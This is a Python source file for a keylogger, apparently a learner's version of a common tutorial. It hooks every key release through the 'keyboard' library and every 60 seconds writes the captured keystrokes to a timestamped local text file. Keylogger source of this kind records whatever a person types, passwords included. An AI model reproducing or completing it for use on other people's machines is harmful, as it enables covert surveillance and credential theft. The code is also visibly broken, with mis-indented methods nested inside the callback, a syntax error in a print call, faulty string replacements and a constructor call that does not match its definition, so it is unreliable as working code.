#for key logs
import keyboard 

#timer to make a method runs after an interval amount time
from threading import Timer
from datetime import datetime

#time to send information
SEND_REPORT_EVERY = 60

class keylogger:
    def __init__(self,interval):
        self.interval = interval
         
         #have to set a reporting method

         self.log=""
         
         #setting the starting and ending time of the keylogger
         self.start_dt = datetime.now();
         self.end_dt = datetime.now()

         #setting a call back function
    
    def callback(self,event):

        name = event.name

        if len(name) > 1:
            #a special key test

            if name == "space":
                #space is set to a #
                name =" "
            elif name == "enter":
                name="[Enter]\n"
            elif name == "decimal":
                name="."
            else:
                #this code will replace space with underscore

                name = name.replace("","_")
                name =f"[{name.upper()}]"

        self.log += name

        #store the recorded keys to a local file
         
        def update_filename(self):
            #creating a file name to be identified by the start time and endtime
            start_dt_str = str(self.start_dt)[:-7].replace(" ","-").replace(":","")
            end_dt_str =str(self.end_dt)[:7].replace("","-").replace(":","")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            #cREATING THE LOF FILE IN THE CURRENT DIRECTORY
            with open(f"{self.filename}.txt" , "w") as key_logs:
                print(self.log file=key_logs)

            print(f"[+] Saved {self.filename}.txt")

        #create a method that reports key logs after every periof of time

        def report(self):

            #the function gets called every 'self.interval'
            if self.log:
                #when key logs are captured are reported
                self.end_dt = datetime.now()

                self.update_filename()

                if self.report_method =="file":
                    self.report_to_file()

                    #print on the console
                    print(f"[{self.filename}] - {self.log}")

                    self.start_dt = datetime.now()
                
            self.log = ""

            timer = Timer(interval=self.interval, function=self.report)

            timer.daemon = True

            timer.start()

        #a call function once a key on the keyboard is released

        def start(self):
            #record the start datetime

            self.start_dt = datetime.now()

            #starts the keylogger
            keyboard.on_release(callback=self.callback)

            #start reporting the keylogs
            self.report()

            print(f"{datetime.now()} - Started Keylogger")

            keyboard.wait()
if __name__ == "__main__":
    keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
